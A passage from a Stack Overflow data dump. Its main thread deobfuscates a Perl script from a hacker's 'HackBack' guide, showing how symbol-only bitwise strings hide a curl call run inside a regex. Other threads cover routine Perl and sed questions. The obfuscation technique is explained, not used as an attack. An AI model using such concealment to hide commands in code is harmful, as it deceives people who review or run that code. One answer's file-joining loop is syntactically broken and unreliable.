58996381, "link": "https://stackoverflow.com/questions/58996381/can-somebody-explain-this-obfuscated-perl-regexp-script/58997332#58997332", "title": "Can somebody explain this obfuscated perl regexp script?", "body": "<p>The basic idea of the code you posted is that each alphanumeric character has been replaced by a bitwise operation between two non-alphanumeric characters. For instance,</p>\n\n<pre><code>'`'|'%'\n</code></pre>\n\n<p>(5th line of the \"star\" in your code)\nIs a bitwise or between backquote and modulo, whose codepoints are respectively 96 and 37, whose \"or\" is 101, which is the codepoint of the letter \"e\". The following few lines all print the same thing:</p>\n\n<pre><code>say '`' | '%' ;\nsay chr( ord('`' | '%') );\nsay chr( ord('`') | ord('%') );\nsay chr( 96 | 37 );\nsay chr( 101 );\nsay \"e\"\n</code></pre>\n\n<p>Your code starts with (ignore whitespaces which don't matter):</p>\n\n<pre><code>'' =~ (\n</code></pre>\n\n<p>The corresponding closing bracket is 28 lines later:</p>\n\n<pre><code>^'(').'\"})')\n</code></pre>\n\n<p>(C-f this pattern to see it on the web-page; I used my editor's matching parenthesis highlighting to find it)</p>\n\n<p>We can assign everything in between the opening and closing parenthesis to a variable that we can then print:</p>\n\n<pre><code>$x =                              '(?'\n                                 .'{'.(\n                                '`'|'%'\n                                ).(\"\\[\"^\n                               '-').('`'|\n                              '!').(\"\\`\"|\n                              ',').'\"(\\\\$'\n                             .':=`'.(('`')|\n                            '#').('['^'.').\n                            ('['^')').(\"\\`\"|\n ',').('{'^'[').'-'.('['^'(').('{'^'[').('`'|'(').('['^'/').('['^'/').(\n'['^'+').('['^'(').'://'.('`'|'%').('`'|'.').('`'|',').('`'|'!').(\"\\`\"|\n  '#').('`'|'%').('['^'!').('`'|'!').('['^'+').('`'|'!').('['^\"\\/\").(\n     '`'|')').('['^'(').('['^'/').('`'|'!').'.'.('`'|'%').('['^'!')\n        .('`'|',').('`'|'.').'.'.('`'|'/').('['^')').('`'|\"\\'\").\n          '.'.('`'|'-').('['^'#').'/'.('['^'(').('`'|('$')).(\n             '['^'(').('`'|',').'-'.('`'|'%').('['^('(')).\n                '/`)=~'.('['^'(').'|&lt;/'.('['^'+').'&gt;|\\\\'\n                   .'\\\\'.('`'|'.').'|'.('`'|\"'\").';'.\n                     '\\\\$:=~'.('['^'(').'/&lt;.*?&gt;//'\n                     .('`'|\"'\").';'.('['^'+').('['^\n                    ')').('`'|')').('`'|'.').(('[')^\n                   '/').('{'^'[').'\\\\$:=~/('.(('{')^\n                   '(').('`'^'%').('{'^'#').('{'^'/')\n                  .('`'^'!').'.*?'.('`'^'-').('`'|'%')\n                 .('['^'#').(\"\\`\"|    ')').('`'|'#').(\n                 '`'|'!').('`'|          '.').('`'|'/')\n                .'..)/'.('['               ^'(').'\"})';\nprint $x;\n</code></pre>\n\n<p>This will print:</p>\n\n<pre><code>(?{eval\"(\\$:=`curl -s https://enlacezapatista.ezln.org.mx/sdsl-es/`)=~s|&lt;/p&gt;|\\\\n|g;\\$:=~s/&lt;.*?&gt;//g;print \\$:=~/(SEXTA.*?Mexicano..)/s\"})\n</code></pre>\n\n<p>The remaining of the code is a bunch of assignments into some variables; probably here only to complete the pattern: the end of the star is:</p>\n\n<pre><code>$:=\"\\.\"^'~';\n$~='@'|'(';\n$^=')'^'[';\n$/='`'|'.';\n$,='(';\n</code></pre>\n\n<p>Which just assigns simple one-character strings to some variables.</p>\n\n<p>Back to the main code:</p>\n\n<pre><code>(?{eval\"(\\$:=`curl -s https://enlacezapatista.ezln.org.mx/sdsl-es/`)=~s|&lt;/p&gt;|\\\\n|g;\\$:=~s/&lt;.*?&gt;//g;print \\$:=~/(SEXTA.*?Mexicano..)/s\"})\n</code></pre>\n\n<p>This code is inside a regext which is matched against an empty string (don't forget that we had first <code>'' =~ (...)</code>). <code>(?{...})</code> inside a regex runs the code in the <code>...</code>. With some whitespaces, and removing the string within the eval, this gives us:</p>\n\n<pre><code># fetch an url from the web using curl _quitely_ (-s)\n($: = `curl -s https://enlacezapatista.ezln.org.mx/sdsl-es/`)\n    # replace end of paragraphs with newlines in the HTML fetched\n    =~ s|&lt;/p&gt;|\\n|g;\n# Remove all HTML tags\n$: =~ s/&lt;.*?&gt;//g;\n# Print everything between SEXTA and Mexicano (+2 chars)\nprint $: =~ /(SEXTA.*?Mexicano..)/s\n</code></pre>\n\n<p>You can automate this unobfuscation process by using <a href=\"https://perldoc.perl.org/B/Deparse.html\" rel=\"noreferrer\"><code>B::Deparse</code></a>: running </p>\n\n<pre><code>perl -MO=Deparse yourcode.pl\n</code></pre>\n\n<p>Will produce something like:</p>\n\n<pre><code>'' =~ m[(?{eval\"(\\$:=`curl -s https://enlacezapatista.ezln.org.mx/sdsl-es/`)=~s|&lt;/p&gt;|\\\\n|g;\\$:=~s/&lt;.*?&gt;//g;print \\$:=~/(SEXTA.*?Mexicano..)/s\"})];\n$: = 'P';\n$~ = 'h';\n$^ = 'r';\n$/ = 'n';\n$, = '(';\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 12416629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ffb49e8e7130761383d66499a4023a?s=128&d=identicon&r=PG&f=1", "display_name": "hugo", "link": "https://stackoverflow.com/users/12416629/hugo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 0, "accepted_answer_id": 58997332, "answer_count": 1, "score": 3, "last_activity_date": 1574437705, "creation_date": 1574433208, "last_edit_date": 1574435509, "question_id": 58996381, "link": "https://stackoverflow.com/questions/58996381/can-somebody-explain-this-obfuscated-perl-regexp-script", "title": "Can somebody explain this obfuscated perl regexp script?", "body": "<p>This code is taken from the <a href=\"https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt\" rel=\"nofollow noreferrer\">HackBack DIY guide to rob banks</a> by Phineas Fisher. It outputs a long text (<a href=\"https://en.wikipedia.org/wiki/Sixth_Declaration_of_the_Lacandon_Jungle\" rel=\"nofollow noreferrer\">The Sixth Declaration of the Lacandon Jungle</a>). Where does it fetch it? I don't see any alphanumeric characters at all. What is going on here? And what does the -r switch do? It seems undocumented.</p>\n\n<pre><code>perl -Mre=eval &lt;&lt;\\EOF\n                                   ''                                     \n                                  =~(                                     \n                                  '(?'                                    \n                                 .'{'.(                                   \n                                '`'|'%'                                   \n                                ).(\"\\[\"^                                  \n                               '-').('`'|                                 \n                              '!').(\"\\`\"|                                 \n                              ',').'\"(\\\\$'                                \n                             .':=`'.(('`')|                               \n                            '#').('['^'.').                               \n                            ('['^')').(\"\\`\"|                              \n ',').('{'^'[').'-'.('['^'(').('{'^'[').('`'|'(').('['^'/').('['^'/').(   \n'['^'+').('['^'(').'://'.('`'|'%').('`'|'.').('`'|',').('`'|'!').(\"\\`\"|   \n  '#').('`'|'%').('['^'!').('`'|'!').('['^'+').('`'|'!').('['^\"\\/\").(     \n     '`'|')').('['^'(').('['^'/').('`'|'!').'.'.('`'|'%').('['^'!')       \n        .('`'|',').('`'|'.').'.'.('`'|'/').('['^')').('`'|\"\\'\").          \n          '.'.('`'|'-').('['^'#').'/'.('['^'(').('`'|('$')).(             \n             '['^'(').('`'|',').'-'.('`'|'%').('['^('(')).                \n                '/`)=~'.('['^'(').'|&lt;/'.('['^'+').'&gt;|\\\\'                  \n                   .'\\\\'.('`'|'.').'|'.('`'|\"'\").';'.                     \n                     '\\\\$:=~'.('['^'(').'/&lt;.*?&gt;//'                        \n                     .('`'|\"'\").';'.('['^'+').('['^                       \n                    ')').('`'|')').('`'|'.').(('[')^                      \n                   '/').('{'^'[').'\\\\$:=~/('.(('{')^                      \n                   '(').('`'^'%').('{'^'#').('{'^'/')                     \n                  .('`'^'!').'.*?'.('`'^'-').('`'|'%')                    \n                 .('['^'#').(\"\\`\"|    ')').('`'|'#').(                    \n                 '`'|'!').('`'|          '.').('`'|'/')                   \n                .'..)/'.('['               ^'(').'\"})')                   \n                ;$:=\"\\.\"^                     '~';$~='@'                  \n               |'(';$^=                          ')'^'[';                 \n              $/='`'                                |'.';                 \n              $,=                                      '('           \nEOF\n</code></pre>\n"}, {"tags": ["perl", "url", "get", "lwp", "html-tableextract"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 12338914, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/45b52c33c847642605c63f9ed3e410c2?s=128&d=identicon&r=PG&f=1", "display_name": "nixv", "link": "https://stackoverflow.com/users/12338914/nixv"}, "edited": false, "score": 0, "creation_date": 1574430236, "post_id": 58995191, "comment_id": 104241321, "body": "Thanks Dave! Now I have problems with the variables ... I want the file to be saved as the _TEXT of the url <code>my $file = &#39;&#47;tmp&#47;$$s[$i]{_TEXT}&#39;;</code> surely it is badly declared"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 1, "user_id": 12338914, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/45b52c33c847642605c63f9ed3e410c2?s=128&d=identicon&r=PG&f=1", "display_name": "nixv", "link": "https://stackoverflow.com/users/12338914/nixv"}, "edited": false, "score": 0, "creation_date": 1574433859, "post_id": 58995191, "comment_id": 104243362, "body": "@nixv: Well, yes. At the very least, you&#39;re going to want to put that string in double-quotes if you want the variables to be expanded."}, {"owner": {"reputation": 1, "user_id": 12338914, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/45b52c33c847642605c63f9ed3e410c2?s=128&d=identicon&r=PG&f=1", "display_name": "nixv", "link": "https://stackoverflow.com/users/12338914/nixv"}, "edited": false, "score": 0, "creation_date": 1574691320, "post_id": 58995191, "comment_id": 104310908, "body": "Thanks! and for your style points too!!!  Now, I have problems decompressing downloaded files :("}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1574434652, "last_edit_date": 1574434652, "creation_date": 1574429036, "answer_id": 58995191, "question_id": 58994994, "link": "https://stackoverflow.com/questions/58994994/download-files-with-perl-lwp-linkextractor/58995191#58995191", "title": "Download files with perl lwp linkextractor", "body": "<p>LWP::Simple can be loaded in two different ways.</p>\n\n<pre><code>use LWP::Simple;\n</code></pre>\n\n<p>This loads the module and makes all of its functions available to your program.</p>\n\n<pre><code>use LWP::Simple qw(list of function names);\n</code></pre>\n\n<p>This loads the module and only makes available the specific set of functions you have requested.</p>\n\n<p>You have this code:</p>\n\n<pre><code>use LWP::Simple qw(get);\n</code></pre>\n\n<p>This makes the <code>get()</code> function available, but not the <code>getstore()</code> function.</p>\n\n<p>To fix this, either add <code>getstore()</code> to your list of functions.</p>\n\n<pre><code>use LWP::Simple qw(get getstore);\n</code></pre>\n\n<p>Or (probably simpler) remove the list of functions.</p>\n\n<pre><code>use LWP::Simple;\n</code></pre>\n\n<p><strong>Update:</strong> I hope you don't mind if I add a couple of style points.</p>\n\n<p>Firstly, you're using a really old module - HTML::LinkExtractor. It hasn't been updated for almost fifteen years. I'd recommend looking at <a href=\"https://metacpan.org/pod/HTML::LinkExtor\" rel=\"nofollow noreferrer\">HTML::LinkExtor</a> instead.</p>\n\n<p>Secondly, your code uses a lot of references, but you're using them in a really over-complicated way. For example, where you have <code>\\$$row[0]</code>, you really only need <code>$row-&gt;[0]</code>. Similarly, <code>$$s[$i]{href}</code> will be easy for most people to understand if written as <code>$s-&gt;[$i]{href}</code>.</p>\n\n<p>Next, you use the C-style for loop and iterate over the array's indexes. It's usually simpler to use <code>foreach</code> to iterate from zero to the last index in the array.</p>\n\n<pre><code>foreach my $i (0 .. $#$s) {\n  print \"$s-&gt;[$i]{_TEXT} $s-&gt;[$i]{href} $t-&gt;[$i]{href} \\n\";\n  my $file = \"/tmp/$s-&gt;[$i]{_TEXT}\";\n  my $url = $s-&gt;[$i]{href};\n  my $content = getstore($url, $file);\n  die \"Couldn't get it!\" unless defined $content;\n}\n</code></pre>\n\n<p>And finally, you seem slightly confused about what <code>getstore()</code> returns. It returns the HTTP response code. So it will never be undefined. If there's a problem retrieving the content, you'll get 500 or 403 or something like that.</p>\n"}], "owner": {"reputation": 1, "user_id": 12338914, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/45b52c33c847642605c63f9ed3e410c2?s=128&d=identicon&r=PG&f=1", "display_name": "nixv", "link": "https://stackoverflow.com/users/12338914/nixv"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1574434652, "creation_date": 1574428260, "question_id": 58994994, "link": "https://stackoverflow.com/questions/58994994/download-files-with-perl-lwp-linkextractor", "title": "Download files with perl lwp linkextractor", "body": "<p>I am trying to download a file from a web page.</p>\n\n<p>First I get the links with the linkextractor and then I want to download them with the lwp\nI'm a newbie programming in perl.</p>\n\n<p>I made the following code ...</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse HTML::TableExtract;\nuse HTML::LinkExtractor;\nuse LWP::Simple qw(get);\nuse Archive::Zip;\n\nmy $html = get $ARGV[0];\n\nmy $te = HTML::TableExtract-&gt;new(\n    keep_html =&gt; 1,\n    headers =&gt; [qw( column1 column2 )],\n);\n$te-&gt;parse($html);\n\n# I get only the first row\nmy ($row) = $te-&gt;rows;\n\nmy $LXM = new HTML::LinkExtractor(undef,undef,1);\n$LXM-&gt;parse(\\$$row[0]);\nmy ($t) = $LXM-&gt;links;\n\nmy $LXS = new HTML::LinkExtractor(undef,undef,1);\n$LXS-&gt;parse(\\$$row[1]);\nmy ($s) = $LXS-&gt;links;\n\n#-------\nfor (my $i=0; $i &lt; scalar(@$s); $i++) {\n  print \"$$s[$i]{_TEXT} $$s[$i]{href} $$t[$i]{href} \\n\";\n  my $file = '/tmp/$$s[$i]{_TEXT}';\n  my $url = $$s[$i]{href};\n  my $content = getstore($url, $file);\n  die \"Couldn't get it!\" unless defined $content;\n}\n</code></pre>\n\n<p>And I get the following error</p>\n\n<pre><code>Undefined subroutine &amp;main::getstore called at ./geturlfromtable.pl line 35.\n</code></pre>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["regex", "bash", "perl", "sed"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 1, "creation_date": 1574427772, "post_id": 58994861, "comment_id": 104240072, "body": "<code>[^\\s]</code> matches any char but <code>\\</code> and <code>s</code>, you need <code>[^[:space:]]*</code> or <code>[^[:space:]]\\{1,\\}</code> instead. Also, your string does not contain <code>ncc-full-druid-broker</code>"}, {"owner": {"reputation": 10206, "user_id": 865866, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/QXzpS.jpg?s=128&g=1", "display_name": "0leg", "link": "https://stackoverflow.com/users/865866/0leg"}, "reply_to_user": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1574427881, "post_id": 58994861, "comment_id": 104240133, "body": "The goal is to get substring between <code>foo-bar</code> and the first empty space."}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 1, "creation_date": 1574428035, "post_id": 58994861, "comment_id": 104240209, "body": "Here you may just use <code>awk &#39;$0 ~ &#47;^foo-bar&#47;{print $1}&#39;</code> or <code>sed -n &#39;s&#47;^.*\\(foo-bar[^[:space:]]*\\).*$&#47;\\1&#47;p&#39;</code>"}, {"owner": {"reputation": 10206, "user_id": 865866, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/QXzpS.jpg?s=128&g=1", "display_name": "0leg", "link": "https://stackoverflow.com/users/865866/0leg"}, "reply_to_user": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1574428179, "post_id": 58994861, "comment_id": 104240263, "body": "Ok, this can be accepted as an answer."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1574436627, "post_id": 58994861, "comment_id": 104244910, "body": "Why not just <code>awk &#39;{print $1}&#39;</code>? If you need more than that then <a href=\"https://stackoverflow.com/posts/58994861/edit\">edit</a> your question to provide a more realistic example."}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 0, "creation_date": 1574506742, "post_id": 58994861, "comment_id": 104262634, "body": "Why not use <code>cut</code> for this purpose if you read from a file? The command should be <code>cut -d &#39; &#39; -f1</code> -- magic here, cut was designed for tasks like this."}], "answers": [{"comments": [{"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1574436519, "post_id": 58994978, "comment_id": 104244865, "body": "also very few seds would recognize <code>\\s</code> as shorthand for <code>[[:space:]]</code> (maybe just GNU sed) and if they did then the opposite would be <code>\\S</code>, not <code>[^\\s]</code>. You don&#39;t need <code>$0 ~</code> in the awk command btw."}], "tags": [], "owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "is_accepted": true, "score": 3, "last_activity_date": 1574428203, "creation_date": 1574428203, "answer_id": 58994978, "question_id": 58994861, "link": "https://stackoverflow.com/questions/58994861/correct-bash-sed-command-syntax-to-get-a-correct-substring/58994978#58994978", "title": "Correct bash sed command syntax to get a correct substring", "body": "<p>There are a couple of issues:</p>\n\n<ul>\n<li><code>.</code> after <code>^</code> requires a single character to be present</li>\n<li><code>(foo-bar)</code> in the POSIX BRE pattern matches <code>(foo-bar)</code> but there are no parentheses in your string</li>\n<li><code>[^\\s]</code> in a POSIX bracket expression matches a char other than <code>\\</code> and <code>s</code>, not a non-whitespace char</li>\n<li><code>+</code> in the POSIX BRE pattern matches a <code>+</code> char.</li>\n</ul>\n\n<p>Use</p>\n\n<pre><code>sed -n 's/^.*\\(foo-bar[^[:space:]]*\\).*/\\1/p'\n</code></pre>\n\n<p>Here, </p>\n\n<ul>\n<li><code>-n</code>  - suppresses the default line output</li>\n<li><code>s</code> - substitution command</li>\n<li><code>/^.*\\(foo-bar[^[:space:]]*\\).*</code>/<code>- matches start of the string, any 0+ chars, captures</code>foo-bar<code>and 0 or more chars other than whitespace into Group 1 (</code>\\1`), and then matches the rest of the string</li>\n<li><code>\\1</code> - replaces the whole match with Group 1  contents</li>\n<li><code>p</code> - prints the result of the substitution.</li>\n</ul>\n\n<p>Alternatively, consider an <code>awk</code> command that will work if the match is always expected at the start of the string:</p>\n\n<pre><code>awk '$0 ~ /^foo-bar/{print $1}'\n</code></pre>\n\n<p>See the <a href=\"https://ideone.com/wpR2vW\" rel=\"nofollow noreferrer\">online demo</a>. It means that if the line starts with <code>foo-bar</code> (<code>$0 ~ /^foo-bar/</code>) <code>awk</code> will print Field 1 (the default field separator is whitespace, so you will get the substring from the start till the first whitespace).</p>\n"}], "owner": {"reputation": 10206, "user_id": 865866, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/QXzpS.jpg?s=128&g=1", "display_name": "0leg", "link": "https://stackoverflow.com/users/865866/0leg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 450, "favorite_count": 0, "accepted_answer_id": 58994978, "answer_count": 1, "score": 3, "last_activity_date": 1574428203, "creation_date": 1574427738, "last_edit_date": 1574427806, "question_id": 58994861, "link": "https://stackoverflow.com/questions/58994861/correct-bash-sed-command-syntax-to-get-a-correct-substring", "title": "Correct bash sed command syntax to get a correct substring", "body": "<p>Trying to get a sub-string from a:</p>\n\n<blockquote>\n  <p>foo-bar-8568887b6f-d95wk        1/1     Running            0          48m</p>\n</blockquote>\n\n<p>to get a:\n<code>foo-bar-8568887b6f-d95wk</code></p>\n\n<p>using:\n<code>sed 's/^.\\((foo-bar)[^\\s]+\\).*$/\\1/'</code></p>\n\n<p>However that would return the whole string:\n<code>foo-bar-8568887b6f-d95wk        1/1     Running            0          48m</code></p>\n\n<p>What is the correct sed command in this case?</p>\n"}, {"tags": ["file", "perl"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1574427575, "post_id": 58994790, "comment_id": 104239971, "body": "What have you tried, what problems are you having? Please show us your code."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1574427689, "post_id": 58994790, "comment_id": 104240030, "body": "Oh, and why do you want to do this with Perl? It sounds to me like a job for the <code>cat</code> command."}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1574439181, "post_id": 58994790, "comment_id": 104246218, "body": "@DaveCross I have added script in the question."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1574446028, "post_id": 58994790, "comment_id": 104249498, "body": "I&#39;m confused -- that last part, using <code>File::Copy::copy</code> ... is that from an answer to this question?  If it is, I&#39;d suggest to avoid adding to the question things that get posted in answers -- it&#39;s very confusing to the reader.  (Example: That last part is a fine solution of your problem, right as it stands, so if you have that then why the question?)"}, {"owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "edited": false, "score": 0, "creation_date": 1574482198, "post_id": 58994790, "comment_id": 104258794, "body": "@vinodk89 I&#39;m extended the File::Copy answer - see notes about &#39;readdir&#39; sort vs <code>glob</code>, and recommended file closing."}], "answers": [{"tags": [], "owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "is_accepted": false, "score": 3, "last_activity_date": 1574482076, "last_edit_date": 1574482076, "creation_date": 1574428078, "answer_id": 58994949, "question_id": 58994790, "link": "https://stackoverflow.com/questions/58994790/perl-combine-multiple-file-contents-to-single-file/58994949#58994949", "title": "Perl combine multiple file contents to single file", "body": "<p>CPAN 'File::Copy' should do the work, you will have to open the output file youself.</p>\n\n<pre><code>use File::Copy ;\nopen my $out, \"&gt;result.log\" ;\ncopy($_, $out) foreach ('file1.log', 'file2.log', );\nclose $out ;\n</code></pre>\n\n<p><strong>Update 1:</strong>\nBased on additional information posted to answer, looks like the ask is to concatenate (in Perl) list of files match a pattern (*.log). Below extends the above solution to include additional logic, using <code>glob</code>, avoiding the <code>readdir</code> and filtering.</p>\n\n<pre><code>use File::Copy ;\n\nopen my $out, \"&gt;result.log\" ;\ncopy($_, $out) foreach glob('/path/to/dir/*.log' );\nclose $out ;\n</code></pre>\n\n<p>Important notes:\n  * Using glob will SORT the file name alphabetically, while readdir does NOT guarantee any order.\n  * The output file 'result.log' match '*.log', should not execute the code in the current directory.</p>\n"}, {"comments": [{"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574441761, "post_id": 58998421, "comment_id": 104247521, "body": "Thanks @DaveCross for the suggestion. <code>cat</code> looks good option. But these files are dynamic. How can I iterrate through loop inorder to catch these files in cat command."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574445990, "post_id": 58998421, "comment_id": 104249475, "body": "@vinodk89: <code>cat somedir&#47;*.log &gt; result_file.log</code>"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1574445964, "last_edit_date": 1574445964, "creation_date": 1574440919, "answer_id": 58998421, "question_id": 58994790, "link": "https://stackoverflow.com/questions/58994790/perl-combine-multiple-file-contents-to-single-file/58998421#58998421", "title": "Perl combine multiple file contents to single file", "body": "<blockquote>\n  <p>Do you think it is feasible solution?</p>\n</blockquote>\n\n<p>I'm afraid not. Your code is the equivalent of typing these commands at your prompt:</p>\n\n<pre><code>$ cp file1.log result_file.log\n$ cp file2.log result_file.log\n$ cp file3.log result_file.log\n$ ... etc ...\n</code></pre>\n\n<p>The problem with this is that it copies each file, in turn over the top of the previous one. So you end up with a copy of the final file in the list.</p>\n\n<p>As I said in a comment, this is most easily done using <code>cay</code> - no need for Perl at all.</p>\n\n<pre><code>$ cat file1.log file2.log file3.log &gt; result_file.log\n</code></pre>\n\n<p>If you really want to do it in Perl, then something like this would work (the first section is rather similar to yours).</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @files;\n\nmy $dir = \"/path/to/directory\";\n\nopendir(my $dh, $dir) or die $!;\n\nwhile (my $file = readdir($dh)) {\n\n    # We only want files\n    next unless (-f \"$dir/$file\");\n\n    # Use a regular expression to find files ending in .log\n    next unless ($file =~ m/\\.log$/);\n\n    print \"$file\\n\";\n\n    push( @files, \"$dir/$file\");\n}\n\nclosedir($dh);\n\nprint Dumper(\\@files);\n\nopen my $out_file, '&gt;', 'result_file.log';\n\nforeach my $fn (@files) {\n    open my $in_file, '&lt;', $fn or die \"$fn: $!\";\n    print $out_file while &lt;$fn&gt;);\n}\n</code></pre>\n"}], "owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 